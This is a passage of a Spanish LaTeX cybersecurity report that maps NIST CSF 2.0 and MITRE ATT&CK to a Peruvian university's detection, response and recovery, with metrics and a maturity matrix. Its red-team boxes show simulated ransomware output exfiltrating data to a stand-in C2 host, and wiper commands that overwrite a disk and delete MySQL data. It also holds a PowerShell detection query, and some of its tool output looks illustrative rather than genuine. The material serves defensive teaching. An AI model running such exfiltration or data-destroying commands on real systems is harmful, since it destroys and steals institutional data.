+La detección corporativa en la UNAP descansa sobre un \textbf{SIEM (Gestión de Información y Eventos de Seguridad / Security Information and Event Management)}. Soluciones como \emph{Elastic Security} o \emph{Wazuh} correlacionan terabytes de logs provenientes de los FortiGate, los switches core de Cisco y los servidores web en un único panel de cristal (Panel Único de Cristal (Single Pane of Glass)).
+
+Para atrapar la ejecución del ataque de PowerShell codificado, los analistas del Equipo Azul (Blue Team) utilizan el lenguaje de consultas KQL (Kibana Query Language) en Elastic, buscando argumentos de línea de comandos anómalos (Técnica: \textit{Command Line Auditing}).
+
+\begin{cmdbox}{Detección: Búsqueda (Cacería de Amenazas (Threat Hunting)) en SIEM (Elastic KQL)}
+\begin{verbatim}
+> GET /winlogbeat-*/_search
+{
+  "query": {
+    "query_string": {
+      \"query\": \"process.name:powershell.exe \ 
+          AND process.command_line:
+                (*EncodedCommand* OR *WindowStyle Hidden* \ 
+          OR *-e *)\"
+    }
+  }
+}
+
+[MATCH: 1 Hit]
+Timestamp: 2026-09-13T09:12:45Z
+Host: DESKTOP-RECTORADO-01
+Command: powershell.exe -ExecutionPolicy Bypass \ 
+         -WindowStyle Hidden -EncodedCo...
+Alert: T1059.001 - Suspicious PowerShell Invocation Detected.
+\end{verbatim}
+\end{cmdbox}
+
+\section{Buenas Prácticas y KPIs para la UNAP}
+Para alcanzar un nivel de madurez repetible en la función de Detección, se requieren las siguientes prácticas operativas:
+\begin{enumerate}
+    \item \textbf{Tuning de Reglas (Reducción de Ruido):} Configurar el SIEM para suprimir las alertas falsas generadas por scripts de mantenimiento legítimos de la OTI, evitando así la "fatiga de alertas" (Fatiga de Alertas (Alert Fatigue)) en los analistas.
+    \item \textbf{Despliegue de Honeypots:} Instalar servidores trampa en la red (ej. un falso portal de base de datos SQL) que no tienen ninguna función legítima. Cualquier intento de conexión a este honeypot es, por definición, 100\% un ataque real.
+    \item \textbf{Auditoría Sysmon:} Habilitar Sysinternals Sysmon en todos los sistemas Windows de la administración para capturar los IDs de eventos 1 (Creación de procesos) y 3 (Conexiones de Red).
+\end{enumerate}
+
+\textbf{Indicadores Clave de Rendimiento (KPIs):}
+\begin{itemize}
+    \item \textbf{KPI 1: Tiempo Medio de Detección (MTTD - Mean Time To Detect):} Es la métrica dorada del SOC (Centro de Operaciones de Seguridad / Security Operations Center). Calcula cuánto tiempo sobrevive un atacante en la red antes de ser detectado (Tiempo de Permanencia (Dwell Time)). La meta de Tier 3 es reducirlo a menos de 2 horas.
+    \begin{equation}
+        MTTD = \frac{\sum (\text{Hora de Generación de Alerta Real} - \text{Hora de Infección Inicial})}{\text{Número Total de Incidentes Reales}}
+    \end{equation}
+
+    \item \textbf{KPI 2: Tasa de Falsos Positivos ($T_{fp}$):} Evalúa la calidad de la ingeniería de detección del SIEM. Un valor alto indica que el equipo pierde tiempo revisando alertas falsas. Meta: $< 15\%$.
+    \begin{equation}
+        T_{fp} = \left( \frac{\text{Número de Alertas Descartadas por ser Actividad Legítima}}{\text{Total de Alertas Críticas y Altas Generadas}} \right) \times 100
+    \end{equation}
+\end{itemize}
+
+\chapter{Respuesta (Respond)}
+\label{ch:respond}
+
+\section{Fundamento y Categorías NIST CSF 2.0}
+La función de \textbf{Respuesta (Respond - RS)} se activa en el momento en que una alerta del SIEM se confirma como un incidente real. El objetivo es contener el impacto del ataque (ej. un ransomware propagándose por los laboratorios) antes de que alcance los sistemas neurálgicos de la UNAP (el SIA o los respaldos inmutables). Una respuesta ineficaz o desorganizada suele causar más daño institucional (pánico, pérdida de datos por apagados abruptos) que el ataque mismo.
+
+Las categorías operativas del NIST aplicables son:
+\begin{itemize}
+    \item \textbf{RS.MA (Gestión de Incidentes / Incident Management):} Define la orquestación de la crisis. Activa el Plan de Respuesta a Incidentes (IRP) y convoca al Equipo de Respuesta a Emergencias Informáticas / Cyber Incident Response Team (CIRT) de la UNAP.
+    \item \textbf{RS.AN (Análisis de Incidentes / Incident Analysis):} Abarca la investigación forense en caliente. Busca determinar el alcance de la brecha: ¿Qué credenciales se robaron? ¿Qué base de datos está cifrada?
+    \item \textbf{RS.MI (Mitigación de Incidentes / Incident Mitigation):} Es la ejecución táctica de contención y erradicación, como aislar servidores o desconectar la conexión troncal a Internet de una facultad.
+\end{itemize}
+
+\section{Metodologías y Mecanismos de Defensa}
+La improvisación durante un ciberataque es fatal. La OTI debe adoptar metodologías estandarizadas:
+
+\textbf{1. Ciclo de Respuesta a Incidentes de SANS (PICERL):}
+Metodología de 6 fases (Preparación, Identificación, Contención, Eradicación, Recuperación, Lecciones Aprendidas). En la fase de \textit{Contención}, la UNAP no debe apagar los servidores infectados (lo que destruiría la memoria RAM valiosa para el análisis forense), sino aislarlos lógicamente de la red. En la \textit{Eradicación}, se purga el malware eliminando los mecanismos de persistencia (ej. llaves de registro o \textit{cron jobs}).
+
+\textbf{2. Playbooks Automatizados (SOAR):}
+La respuesta manual es demasiado lenta contra ataques de máquina a máquina. La metodología SOAR (Orquestación, Automatización y Respuesta de Seguridad / Security Orchestration, Automation, and Response) pre-programa flujos de trabajo. Si se detecta un inicio de sesión imposible (ej. un alumno conectándose desde Puno y China simultáneamente), el Playbook revoca automáticamente el token de sesión sin intervención humana.
+
+\section{Vector de Ataque y Técnicas Ofensivas (Equipo Rojo (Red Team))}
+El peor escenario durante la respuesta es el cifrado extorsivo de la infraestructura académica.
+\begin{itemize}
+    \item \textbf{Vectores MITRE ATT\&CK:} El Equipo Rojo (Red Team) despliega \textbf{T1486 (Data Encrypted for Impact)}, simulando la ejecución de una cepa de ransomware en un servidor Linux que aloja repositorios de tesis. Previamente, utilizan \textbf{T1048 (Exfiltration Over Alternative Protocol)} para extraer los archivos por HTTPS hacia un servidor de Mando y Control (C2) para doble extorsión.
+\end{itemize}
+
+El Equipo Rojo (Red Team) simula el impacto utilizando criptografía real (ej. OpenSSL o scripts en Python) sobre datos de prueba, demostrando la velocidad con la que un atacante puede inutilizar la operación universitaria.
+
+\begin{cmdbox}{Ataque: Ejecución de Ransomware Extorsivo (T1486)}
+\begin{verbatim}
+root@kali-redteam:~# python3 ransomware_sim.py \ 
+                     --target /var/www/html/tesis
+[*] Generating RSA-2048 keypair...
+[*] Exfiltrating 2.4GB to https://c2-redteam.org/upload \ 
+    (T1048)... Done.
+[*] Encrypting files with AES-256 (T1486)...
+[+] Encrypted: /var/www/html/tesis/proyecto_ingenieria_2026.pdf
+[+] Encrypted: /var/www/html/tesis/db_backup.sql
+[!] 14,302 files encrypted in 4.2 seconds.
+[*] Dropping README_RANSOM.txt...
+\end{verbatim}
+\end{cmdbox}
+
+\section{Herramientas y Controles de Defensa (Equipo Azul (Blue Team))}
+La defensa activa se ejecuta a través de herramientas de EDR (como \emph{CrowdStrike Falcon} o \emph{Wazuh}) y orquestadores SOAR (como \emph{TheHive} o \emph{Cortex XSOAR}). 
+
+Cuando el SIEM detecta el proceso de cifrado (alta tasa de lectura/escritura y cambio de extensiones), invoca un webhook hacia el módulo de Respuesta Activa de Wazuh. En lugar de bloquear la IP del atacante en el firewall perimetral (medida inútil pues el atacante ya está dentro), se ejecuta un aislamiento (Containment) local en el kernel del servidor infectado mediante \texttt{iptables}.
+
+\begin{cmdbox}{Defensa: Aislamiento Lógico del Host Comprometido (Wazuh AR)}
+\begin{verbatim}
+root@host-infectado:~# iptables -F
+root@host-infectado:~# iptables -A INPUT -s 192.168.10.10 \ 
+                       -j ACCEPT
+root@host-infectado:~# iptables -A OUTPUT -d 192.168.10.10 \ 
+                       -j ACCEPT
+root@host-infectado:~# iptables -P INPUT DROP
+root@host-infectado:~# iptables -P FORWARD DROP
+root@host-infectado:~# iptables -P OUTPUT DROP
+root@host-infectado:~# echo \"Host aislado. \ 
+                       Solo comunica con Wazuh Manager.\"
+\end{verbatim}
+\end{cmdbox}
+
+\section{Buenas Prácticas y KPIs para la UNAP}
+Para garantizar que la respuesta sea un proceso de Tier 3 (Repetible y Formal), se establecen las siguientes prácticas:
+\begin{enumerate}
+    \item \textbf{Ejercicios de Mesa (Ejercicios de Simulación de Mesa (Tabletop Exercises)):} Realizar simulacros de crisis semestrales con el Rectorado y la Oficina de Imagen Institucional, evaluando cómo respondería la universidad a un secuestro de datos en plena semana de matrículas.
+    \item \textbf{Cadena de Custodia Forense:} Si el ataque involucra fraude financiero (ej. tesorería), el equipo de TI debe crear imágenes bit a bit (clonado forense) de los discos antes de restaurarlos, para permitir peritajes legales posteriores.
+    \item \textbf{Aislamiento Dinámico de Red:} Mantener la capacidad de segmentar o apagar segmentos de red (ej. aislar la Facultad de Derecho) desde el switch core sin afectar al resto de la universidad.
+\end{enumerate}
+
+\textbf{Indicadores Clave de Rendimiento (KPIs):}
+\begin{itemize}
+    \item \textbf{KPI 1: Tiempo Medio de Contención (MTTC - Mean Time To Contain):} Mide la velocidad del equipo de respuesta para detener la propagación del ataque tras ser detectado. Meta Tier 3: $< 1$ hora.
+    \begin{equation}
+        MTTC = \frac{\sum (\text{Hora de Aislamiento del Host} - \text{Hora de Detección de la Alerta})}{\text{Número Total de Incidentes Confirmados}}
+    \end{equation}
+
+    \item \textbf{KPI 2: Tasa de Eficacia de Playbooks Automatizados ($TE_p$):} Mide la confianza y automatización del SOC (Centro de Operaciones de Seguridad / Security Operations Center), evaluando cuántos incidentes fueron mitigados por software sin necesidad de un analista humano.
+    \begin{equation}
+        TE_p = \left( \frac{\text{Incidentes Contenidos Automáticamente por SOAR}}{\text{Total de Incidentes de Nivel 1 y 2}} \right) \times 100
+    \end{equation}
+\end{itemize}
+
+\chapter{Recuperación (Recover)}
+\label{ch:recover}
+
+\section{Fundamento y Categorías NIST CSF 2.0}
+La función de \textbf{Recuperación (Recover - RC)} es el último recurso de la resiliencia institucional. Se ejecuta cuando la contención ha fallado o el daño ya está hecho (ej. un servidor de base de datos fue destruido). El objetivo es restaurar las operaciones académicas y administrativas de la UNAP a su estado normal de forma oportuna, reduciendo el impacto financiero, operativo y reputacional.
+
+Las categorías oficiales implementadas son:
+\begin{itemize}
+    \item \textbf{RC.RP (Ejecución del Plan de Recuperación de Incidentes / Incident Recovery Plan Execution):} Asegura que los procesos de restauración (ej. levantar respaldos de máquinas virtuales o reconstruir bases de datos MySQL) se ejecuten durante y después de un incidente basándose en un plan preestablecido.
+    \item \textbf{RC.CO (Comunicación de Recuperación de Incidentes / Incident Recovery Communication):} Abarca la gestión de relaciones públicas. Es crítico que la universidad sepa comunicar la caída del SIA a los estudiantes, al Ministerio de Educación (MINEDU) y a la SUNEDU, manejando la crisis reputacional.
+\end{itemize}
+
+\section{Metodologías y Mecanismos de Defensa}
+La recuperación no se improvisa bajo presión; se basa en arquitecturas diseñadas años antes del incidente.
+
+\textbf{1. Gestión de Continuidad del Negocio / Business Continuity Management (BCM, ISO 22301):}
+Esta norma internacional guía a la UNAP para crear su Plan de Recuperación ante Desastres / Disaster Recovery Plan (DRP). Define matemáticamente cuánto tiempo puede estar caída la universidad antes de incurrir en pérdidas irrecuperables de información (RPO) o multas regulatorias (RTO).
+
+\textbf{2. Arquitectura de Respaldo 3-2-1-1-0:}
+El estándar moderno de oro contra el ransomware. Exige: \textbf{3} copias de los datos de la UNAP, en \textbf{2} medios distintos (ej. disco y cinta), \textbf{1} copia fuera del sitio (Fuera de Sitio (Offsite) / Nube), \textbf{1} copia \textit{Aislado Físicamente (Air-gapped)} o Inmutable (no modificable ni por el administrador root), y \textbf{0} errores (verificados mediante pruebas automatizadas de restauración).
+
+\section{Vector de Ataque y Técnicas Ofensivas (Equipo Rojo (Red Team))}
+Los actores de amenazas avanzadas / Advanced Persistent Threats (APTs) o atacantes patrocinados por estados (State-Sponsored) a veces no buscan dinero, sino causar daño irreversible a la infraestructura de una institución pública.
+\begin{itemize}
+    \item \textbf{Vectores MITRE ATT\&CK:} El Equipo Rojo (Red Team) ejecuta \textbf{T1485 (Data Destruction: Wiper)}. A diferencia del ransomware que cifra para pedir rescate, el Wiper sobrescribe los sectores del disco duro con ceros u otra basura criptográfica, destruyendo el Master Boot Record (MBR) y las tablas de bases de datos para impedir cualquier recuperación convencional.
+\end{itemize}
+
+El Equipo Rojo (Red Team) simula este ataque devastador en un entorno de laboratorio de la UNAP para evaluar si la OTI es capaz de reconstruir un servidor desde sus cimientos (Restauración desde Cero (Bare-Metal Restore)) confiando únicamente en sus repositorios inmutables.
+
+\begin{cmdbox}{Ataque: Destrucción de Datos (T1485) tipo Wiper}
+\begin{verbatim}
+root@kali-redteam:~# ssh root@db-siga.unap.edu.pe
+root@db-siga:~# echo "Iniciando sobrescritura de sectores..."
+root@db-siga:~# dd if=/dev/urandom of=/dev/sda bs=1M \ 
+                count=1024 status=progress
+1073741824 bytes (1.1 GB, 1.0 GiB) copied, 12 s, 89.5 MB/s
+root@db-siga:~# rm -rf /var/lib/mysql/*
+root@db-siga:~# echo "Sistema de archivos destruido. Reiniciando."
+root@db-siga:~# init 6
+\end{verbatim}
+\end{cmdbox}
+
+\section{Herramientas y Controles de Defensa (Equipo Azul (Blue Team))}
+La defensa contra un ataque destructivo depende enteramente de la infraestructura de almacenamiento secundario. La OTI utiliza soluciones de nivel empresarial como \emph{Veeam Backup \& Replication} o entornos Open Source robustos como \emph{Bacula} y \emph{Proxmox Backup Server}.
+
+Para combatir ataques Wiper (T1485) o Ransomware (T1486), la UNAP configura repositorios inmutables (ej. S3 Object Lock o ZFS Snapshots con retención rígida). Esto asegura que aunque el atacante obtenga acceso \texttt{root} al servidor de backups, el sistema de archivos subyacente rechace la solicitud de borrado.
+
+\begin{cmdbox}{Defensa: Restauración desde Snapshot Inmutable (ZFS)}
+\begin{verbatim}
+root@backup-server:~# zfs list -t snapshot | grep siga_prod
+tank/backups/siga_prod@auto-20260913-0000   1.2G  -   45G  -
+
+root@backup-server:~# zfs destroy \ 
+                      tank/backups/siga_prod@auto-20260913-0000
+cannot destroy 'tank/backups/siga_prod@auto-20260913-0000': 
+dataset is immutable (retention period active).
+
+root@backup-server:~# zfs rollback \ 
+                       tank/backups/siga_prod@auto-20260913-0000
+[OK] LUN restaurada al estado inmutable del día anterior.
+root@backup-server:~# zcat /tank/backups/siga_prod.sql.gz \ 
+                      | mysql -u root
+\end{verbatim}
+\end{cmdbox}
+
+\section{Buenas Prácticas y KPIs para la UNAP}
+La madurez Tier 3 exige abandonar la esperanza y abrazar la ingeniería de la resiliencia:
+\begin{enumerate}
+    \item \textbf{Restauración Automatizada (SureBackup):} Configurar el sistema de backups para que, cada domingo, levante automáticamente las máquinas virtuales críticas de la UNAP en un entorno de pruebas aislado (sandbox) y verifique si el servicio web responde, garantizando que el backup realmente sirve.
+    \item \textbf{Plan de Comunicaciones (Fuera de Banda (Out of Band)):} Mantener un canal alternativo (ej. un grupo de Signal o servidores de correo en la nube independientes) para que las autoridades de la UNAP puedan comunicarse si el correo institucional primario cae.
+    \item \textbf{Clasificación de Criticidad (Tiering):} No todos los sistemas pueden restaurarse primero. Clasificar al SIA y a planillas como "Prioridad 1", y dejar los portales informativos de extensión universitaria como "Prioridad 3".
+\end{enumerate}
+
+\textbf{Indicadores Clave de Rendimiento (KPIs):}
+\begin{itemize}
+    \item \textbf{KPI 1: Tiempo Objetivo de Recuperación / Recovery Time Objective (RTO):} Mide la desviación entre el tiempo ideal pactado por las autoridades para levantar un servicio y el tiempo real que tardó la OTI durante el incidente (o simulacro).
+    \begin{equation}
+        \text{Desviación RTO} = \left( \frac{\text{Tiempo de Restauración Real} - \text{RTO Aprobado en DRP}}{\text{RTO Aprobado en DRP}} \right) \times 100
+    \end{equation}
+
+    \item \textbf{KPI 2: Punto Objetivo de Recuperación / Recovery Point Objective (RPO):} Mide la cantidad de horas de datos de la UNAP que se perdieron irreversiblemente porque no llegaron a respaldarse antes del ataque.
+    \begin{equation}
+        \text{Desviación RPO} = \left( \frac{\text{Hora del Desastre} - \text{Hora del Último Backup Exitoso}}{\text{RPO Aprobado en DRP}} \right)
+    \end{equation}
+\end{itemize}
+
+\cleardoublepage
+\chapter{Matriz de Integración y Madurez}
+\label{ch:matriz}
+
+El siguiente cuadro consolida el ciclo de vida NIST CSF 2.0 en la UNAP, interrelacionando los marcos de ataque (MITRE ATT\&CK), las defensas operativas y las métricas directivas (KPIs). El objetivo final de la universidad es llevar cada uno de estos controles desde un nivel Ad-Hoc (Tier 1/2) hacia un estado Repetible e Institucionalizado (Tier 3).
+
+\begin{center}
+\renewcommand{\arraystretch}{1.5}
+\begin{longtable}{|p{2.5cm}|p{3.5cm}|p{4cm}|p{4cm}|}
+\hline
+\rowcolor{coverfgcolor} \textcolor{white}{\textbf{Fase (NIST)}} & \textcolor{white}{\textbf{Amenaza (MITRE)}} & \textcolor{white}{\textbf{Defensa / Herramienta}} & \textcolor{white}{\textbf{Métrica KPI}} \\ \hline
+\endfirsthead
+\multicolumn{4}{c}{\tablename\ \thetable\ -- \textit{Continuación}} \\
+\hline
+\rowcolor{coverfgcolor} \textcolor{white}{\textbf{Fase (NIST)}} & \textcolor{white}{\textbf{Amenaza (MITRE)}} & \textcolor{white}{\textbf{Defensa / Herramienta}} & \textcolor{white}{\textbf{Métrica KPI}} \\ \hline
+\endhead
+\hline \multicolumn{4}{r}{\textit{Continúa en la siguiente página...}} \\
+\endfoot
+\hline
+\endlastfoot
+
+\textbf{Gobernanza (GV)} & T1195 Compromiso Cadena de Suministro, T1078 & GRC (Eramba), Políticas PSI, Comité CSI & \% Autoridades capacitadas. \\ \hline
+\rowcolor{nuanbai}
+\textbf{Identificación (ID)} & T1595 Escaneo Activo & ITAM (Snipe-IT), Nessus, CMDB & \% Activos en CMDB. \\ \hline
+\textbf{Protección (PR)} & T1110 Fuerza Bruta, T1552 Credenciales no seguras & NGFW, EDR, VPN, MFA Obligatorio & \% Endpoints con MFA. \\ \hline
+\rowcolor{nuanbai}
+\textbf{Detección (DE)} & T1059 Intérprete de Comandos & SIEM (Wazuh), IDS/IPS (Snort) & MTTD (Mean Time to Detect). \\ \hline
+\textbf{Respuesta (RS)} & T1486 Datos Cifrados por Impacto & SOAR, Firewall CLI, Plan IRP & MTTC (Mean Time to Contain). \\ \hline
+\rowcolor{nuanbai}
+\textbf{Recuperación (RC)} & T1485 Destrucción de Datos & Veeam, Respaldos 3-2-1-1-0 inmutables & RTO y RPO evaluados empíricamente. \\ \hline
+\end{longtable}
+\end{center}
+
+
+
+\cleardoublepage
+\chapter{Conclusiones y Recomendaciones}
+\label{ch:conclusiones}
+
+\section{Conclusión del Análisis}
+La adopción del \textbf{NIST Cybersecurity Framework 2.0} en la Universidad Nacional del Altiplano (UNAP) representa un salto cualitativo hacia la resiliencia, con miras a alcanzar el \textbf{Tier 3 (Repetible)} de madurez. Al mapear las tácticas ofensivas de \textbf{MITRE ATT\&CK} frente a las funciones defensivas del CSF, se demuestra que la protección tecnológica (EDR, Firewalls) es inútil sin una Gobernanza fuerte y métricas claras (MTTD, MTTC, RTO).
+
+\section{Recomendaciones Finales para la OTI-UNAP}
+\begin{itemize}
+    \item \textbf{Ejecución basada en Métricas:} Implementar un tablero de control (Dashboard) que reporte mensualmente al rectorado el avance de los KPIs establecidos en el Capítulo 8.
+    \item \textbf{Cultura de Seguridad Continua:} Trascender la tecnología enfocándose en el factor humano, cerrando la brecha de vulnerabilidad mediante programas antifraude obligatorios para estudiantes y docentes.
+\end{itemize}
+
+
+\cleardoublepage
+\phantomsection
+\renewcommand{\bibname}{Bibliografía}
+\addcontentsline{toc}{chapter}{Bibliografía}
+\nocite{*}
+\bibliographystyle{unsrtnat}
+\bibliography{references}
+
+\end{document}
+
